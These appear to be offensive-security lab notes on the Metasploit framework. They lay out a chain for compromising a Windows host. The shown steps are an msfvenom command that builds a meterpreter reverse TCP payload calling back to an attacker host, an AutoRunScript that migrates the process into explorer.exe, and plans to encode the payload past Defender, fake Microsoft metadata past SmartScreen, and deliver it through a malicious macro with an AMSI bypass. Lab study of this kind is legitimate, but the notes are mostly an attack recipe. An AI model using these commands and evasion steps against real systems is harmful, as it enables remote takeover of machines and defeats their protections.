## Metasploit framework notes

#### Auto Run Script

```
set AutoRunScript "migrate -n explorer.exe"
```

### Ch1 Notes

1. Identify the web port on 192.168.49.121  allowing file upload. Upload a doc file which allow which allow [ping marco](/msf/ping.vba) command to verify the target allowing code execution though marco 

2. Create stageless tcp raw payload 
```
sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.49.141  LPORT=443 -f raw -o tcp.bin
```
3. Patch the payload
- **encode the payload with custom wrapper to create exe to bypass defender**
- **append microsoft binary meta data to the payload to bypass smart screen**

4. Create malicious marco with amsi bypass and download our malicou payload to remote host, 
- encode the marco content with powershell  [marco  xor Payload encoder](/msf/payloadencoder.ps)
- Craft the [marco full download with asmi](/msf/asmibypasswithxor.vba)
